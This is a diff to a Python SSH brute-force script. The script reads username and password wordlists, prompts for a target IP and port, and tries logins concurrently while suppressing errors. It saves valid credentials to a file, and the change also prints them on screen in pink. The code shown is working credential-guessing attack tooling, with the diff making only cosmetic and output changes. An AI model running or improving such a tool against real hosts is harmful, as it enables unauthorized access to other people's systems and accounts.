@@ -48,9 +48,8 @@ try:
     # Use PathCompleter for tab autocompletion on file paths
     user_list = prompt("Enter Path Of Users List: ", completer=PathCompleter())
     pass_list = prompt("Enter Path Of Password List: ", completer=PathCompleter())
-    
-    host = input("\n\033[38;5;220m[*] Enter target ip: \033[0m")
-    port = input("\n\033[38;5;220m[*] Enter port: \033[0m")
+    host = input("\033[38;5;220m[*] Enter target ip: \033[0m")
+    port = input("\033[38;5;220m[*] Enter port: \033[0m")
     print('\n')
     print("\033[38;5;46m[+] BruteForce Started....\033[0m")
     print('\n')
@@ -81,19 +80,23 @@ async def ssh_bruteforce(username, password):
         sys.stdout = open(os.devnull, 'w')  # Redirect stdout to /dev/null
         print("\033[38;5;202m[*] Username:\033[0m", username, "\033[38;5;202m| [*] Password:\033[0m", password)
         sys.stdout = output_file  # Restore the original stdout
-        
+
         # Wrap the entire SSH connection attempt in a try-except block to suppress all exceptions
         try:
             await asyncio.to_thread(client.connect, host, port, username, password, timeout=5)
-            print("\033[38;5;82m[✔] Valid Credentials Found - Check Success.txt\033[0m")
+            print("\033[38;5;206m[✔] Valid Credentials Found - Check Success.txt\033[0m")  # Pink color
+            # Print credentials on the screen in pink
+            print("\033[38;5;206mUsername:", username, "| Password:", password, "\033[0m")
             with open(success_file, "a") as success:
                 success.write(f"Username: {username} | Password: {password}\n")
         except Exception:
             pass  # Suppress all exceptions
-        
+
         client.close()
     except Exception as e:
         print("\033[38;5;196mAn error occurred:", e, "\033[0m")
+
+
 
 # Create an event loop and gather all SSH attempts concurrently with a progress bar
 async def main():
